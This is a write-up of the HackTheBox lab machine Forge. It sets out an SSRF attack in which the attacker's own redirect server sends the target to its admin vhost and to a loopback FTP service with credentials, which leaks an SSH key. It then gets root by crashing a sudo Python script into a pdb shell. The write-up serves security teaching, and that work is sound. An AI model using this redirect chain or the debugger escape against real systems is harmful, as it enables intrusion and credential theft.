---
layout: post
title: "The Errand Boy Who Trusted His Own Address"
subtitle: "HTB Forge, where a server fetches any URL you name, you teach it to fetch from itself, and a debugger left running as root hands you the crown"
date: 2022-01-29 12:00:00 +0000
description: "Forge is a server that runs your errands. Teach it to walk back to its own front door and it fetches the user's SSH key, and a debugger left wired to a crash hands you root."
image: /assets/og/the-errand-boy-who-trusted-his-own-address.png
tags: [hackthebox, writeup]
---

Forge is a server that will run your errands. You hand it a web address, it walks over, fetches whatever is there, and brings it back to you. That sounds harmless until you notice the server can reach places you cannot. There is an admin door that only opens for visitors coming from inside the building, and there is an FTP closet locked behind a firewall. So you stop trying to walk through those doors yourself. You write the address on a slip of paper, hand it to the errand boy, and let him walk in for you. He trusts the building. He trusts his own front step. He never once asks why a stranger keeps sending him to fetch his own secrets. At the end of the climb sits the real prize, a maintenance script running as root that drops you into a debugger the second it trips, and a debugger is just a shell with better manners.

```
        F O R G E   D E L I V E R Y   C O .
        ===================================
        you:   "go fetch this url for me"
        server: walks off, comes back with the page

        the admin door:  "locals only"
        the ftp closet:   locked behind a firewall

        so you write:  go to MY server
        your server:   "actually, go to ftp://you:pass@127.0.0.1"
        the errand boy: shrugs, walks home, opens his own closet,
                        and hands you the key that was inside.
                                                            鍛
```

## 0x01 · the storefront

Three ports, and one of them is already sulking. An `nmap -sC -sV` paints a tidy little Ubuntu web host.

```
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open     http    Apache httpd 2.4.41
```

That `filtered` on 21 is the first tell. FTP is running, but a firewall sits between you and it, so the front of the building has no way in. Hold that thought. The whole box is about reaching a room you are not allowed to walk to.

The site on 80 is a photo gallery for `forge.htb`, and the page worth staring at is `/upload`. It takes a picture two ways. You can hand it a file, or you can hand it a URL and let the server go grab the image itself. Any time a web app fetches a URL you typed, your ears should prick up, because you are no longer the one making the request. The server is, and the server lives somewhere you do not.

## 0x02 · the door marked locals only

First, find the room you are not invited to. A vhost brute force points the same IP at a list of hostnames and watches which one answers differently.

```
$ wfuzz -u http://10.10.11.111 -H "Host: FUZZ.forge.htb" \
    -w subdomains-top1million-20000.txt --hw 26
...
000000123:  200   admin
```

`admin.forge.htb`. Visit it through your browser and it slams the door: only localhost is allowed in. Picture a members-only club where the bouncer only checks one thing, the street you walked in from. If you arrive from outside, denied. If you arrive from the club's own hallway, welcome back, sir. You are outside. The errand boy on port 80 is inside.

So the plan writes itself. Get the `/upload` fetcher to request `admin.forge.htb` for you. The request will originate from the server itself, from inside the hallway, and the bouncer will wave it through. This is server-side request forgery, SSRF, the art of making a trusted machine knock on a door you cannot reach.

## 0x03 · the deny list with a back door

Of course it is not that easy, or it would not be a Medium box. The upload code reads the URL you pass and refuses anything that smells like the local machine. The filter blocks four strings outright.

```
forge.htb
127.0.0.1
0.0.0.0
localhost
```

A blunt instrument. It is case sensitive, and more importantly, it only inspects the address *you* typed. It cannot see where that address leads after the first hop. And that gap is the whole game.

Here is the move. You do not point the server at the forbidden words. You point it at your own machine, which is allowed, and your machine answers with a redirect that sends it somewhere forbidden. The `requests` library that does the fetching follows redirects by default, like a courier who obeys a forwarding sticker without re-reading the rulebook. Think of it like writing a permitted address on the envelope, and inside the envelope a note that says actually deliver this to the address we both agreed not to mention. The mailroom checks the envelope, sees nothing wrong, and the courier follows the note.

Stand up a tiny Flask server that does nothing but redirect.

```
# your box, 10.10.14.4, listening on 80
@app.route('/<path:p>')
def go(p):
    return redirect("http://admin.forge.htb/...", code=302)
```

Now feed the upload its permitted address.

```
POST /upload
url=http://10.10.14.4/iceberg&remote=1
```

The server fetches your URL, gets a 302, dutifully follows it to `admin.forge.htb`, and because that second request comes from the server itself, the bouncer lets it in. The deny list never had a chance, because it was guarding the front of the envelope while the real instruction rode inside.

## 0x04 · the errand boy opens his own closet

Inside the admin site, the announcements page is chatty in the way internal pages always are. It explains that the upload endpoint there can be scripted, that you simply pass `?u=<url>` and it fetches that for you. And it mentions, helpfully, that an internal FTP server was set up with credentials `user:heightofsecurity123!`.

Two doors, one key. The admin upload is another fetcher, and `requests` speaks more than HTTP. It speaks `ftp://` too. So you chain the redirect one layer deeper. Your Flask server now bounces the errand boy not to a web page, but to the FTP closet that the firewall was hiding, addressed from inside where no firewall stands.

```
# your redirect now returns 302 to:
ftp://user:heightofsecurity123!@127.0.0.1/.ssh/
```

The server, standing in its own hallway, walks to its own FTP service on loopback, logs in, and lists the directory. Whatever it fetches gets saved and served back to you at a random path under `/uploads/`. You just read it.

```
$ curl http://10.10.14.4/3?f=user.txt    # your redirect target file
$ curl http://admin.forge.htb/uploads/<random>
████████████████████████████████
```

Same trick, aimed one drawer over, pulls the user's SSH private key.

```
# redirect target -> ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
```

The filename is the username. SSH in as `user`.

```
$ ssh -i id_rsa user@forge.htb
user@forge:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

A firewall that perfectly blocked you from FTP did nothing at all, because the request that mattered never came from your side of it. It came from the one machine the firewall was built to protect.

## 0x05 · the debugger left armed

`sudo -l` is the first thing you ask any Linux box, and Forge answers with a gift.

```
user@forge:~$ sudo -l
User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

You can run that script as root, no password. Read it. It opens a socket on a random high port, prints which one, asks for a password (`secretadminpassword`), then offers a little menu, view processes, view memory, view sockets, quit. You connect with netcat to the port it announced.

```
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:28050

# second terminal
user@forge:~$ nc 127.0.0.1 28050
Enter the secret password: secretadminpassword
What do you wanna do:
[1] ... [2] ... [3] ... [4] quit
```

Now the flaw. The menu reads your choice and shoves it straight into `int()` with no checking. The author of the script even wrapped the whole thing in a safety net, except the safety net is the bug. When `int()` chokes on garbage, the `except` block calls `pdb.post_mortem()`, which drops you into Python's interactive debugger, sitting in the dead process, which is still running as root.

Picture a vault with a panic button wired backward. Jam the lock with the wrong key, the alarm trips, and instead of summoning the guard the panic button swings the vault door wide and turns on the lights for you. The crash was supposed to help an engineer inspect a problem. It hands the inspection to whoever caused the crash.

So you cause the crash. Type something that is not a number.

```
What do you wanna do: iceberg
*** ValueError: invalid literal for int() with base 10: 'iceberg'
(Pdb)
```

A debugger prompt is a Python prompt, and a Python prompt with root behind it is the end of the line. You do not need an exploit. You just ask the language to run a shell.

```
(Pdb) import os; os.system('/bin/bash')
root@forge:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@forge:/home/user# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

Forge is two confessions stacked into one box, and neither of them is a memory-corruption magic trick.

The first is that a server's trust does not transfer to you, but it absolutely transfers to anything the server fetches on your behalf. The deny list was not stupid. It blocked the obvious words. What it could not do was reason about the *destination* of a request once a redirect entered the picture, because by then the dangerous part of the address lived somewhere the filter never looked. This is the trap at the heart of every SSRF. You are not the one knocking. You convinced a machine that is already inside to knock for you, and firewalls, allow lists, and loopback-only services all quietly assume that whoever is knocking from inside belongs there. Block a hostname and you have guarded one word. The platform has a dozen ways to reach the same room, and an attacker needs exactly one.

The second confession is gentler and somehow worse. The privesc was not an unpatched anything. It shipped green. A maintenance script caught an exception and, trying to be helpful, opened a debugger on the failure. Defensive code, written in good faith, that happened to be running as root and happened to treat a crash as an invitation. You cannot patch your way out of that with `apt upgrade`, because nothing is out of date. The lesson is that a debugger is a loaded weapon and `post_mortem` in production is the safety left off. Convenience for the engineer is a doorway for everyone else, and root makes every doorway the front one.

## 0x07 · outro

```
you could not reach the door, so you sent the one who could.
the filter guarded a word while the real address rode inside the envelope.
the firewall held perfectly, and protected nothing, because the call came from within.

then a crash you caused on purpose opened a debugger,
and a debugger running as root is just a throne with a question mark.

mind what your servers fetch. never trust a request just because it came from home. wear black.

                                                            EOF
```

---

*HTB: Forge, retired 22 Jan 2022. A medium Linux box that is really a lecture on SSRF and misplaced inside-trust, with a privilege escalation that was never a missing patch, just a debugger someone left armed. The errand boy still runs your errands in a lab and nowhere you don't own.*